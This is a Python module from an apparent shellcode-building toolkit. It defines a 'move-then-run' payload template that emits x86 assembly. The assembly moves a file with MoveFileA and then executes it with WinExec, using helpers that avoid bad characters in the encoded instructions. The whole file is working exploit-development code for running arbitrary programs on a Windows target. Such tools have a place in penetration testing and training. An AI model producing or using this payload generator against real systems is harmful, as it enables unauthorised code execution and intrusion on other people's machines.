"""Move-then-run payload template.

Moves a file to a destination path, then executes it via WinExec.
dst_path serves double duty: it is the move destination AND the command line.

Requires functions: MoveFileA, WinExec
Requires string slots: src_path, dst_path
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import safe_push_imm, safe_lea, safe_call_mem


class MoveThenRunTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        movefile_off = -layout.slot("MoveFileA").offset
        winexec_off  = -layout.slot("WinExec").offset
        bc = config.badchars

        try:
            src_off = -layout.slot("src_path").offset
            dst_off = -layout.slot("dst_path").offset
        except KeyError as e:
            raise ValueError(
                f"MoveThenRunTemplate requires 'src_path' and 'dst_path' string slots. "
                f"Missing: {e}"
            ) from e

        return "\n".join([
            "; -- Move Then Run Payload --",
            "",
            "    ; MoveFileA(&src_path, &dst_path)",
            *safe_lea("eax", "ebp", src_off, bc),
            *safe_lea("ebx", "ebp", dst_off, bc),
            "    push ebx                  ; lpNewFileName",
            "    push eax                  ; lpExistingFileName",
            *safe_call_mem("ebp", movefile_off, bc),
            "",
            "    ; WinExec(&dst_path, SW_SHOWNORMAL)",
            *safe_lea("eax", "ebp", dst_off, bc),
            *safe_push_imm(0x1, bc),
            "    ; uCmdShow = SW_SHOWNORMAL",
            "    push eax                  ; lpCmdLine = dst_path",
            *safe_call_mem("ebp", winexec_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path (moved, not copied)", config.src_path),
            ("Destination path (also executed)", config.dst_path),
        ]
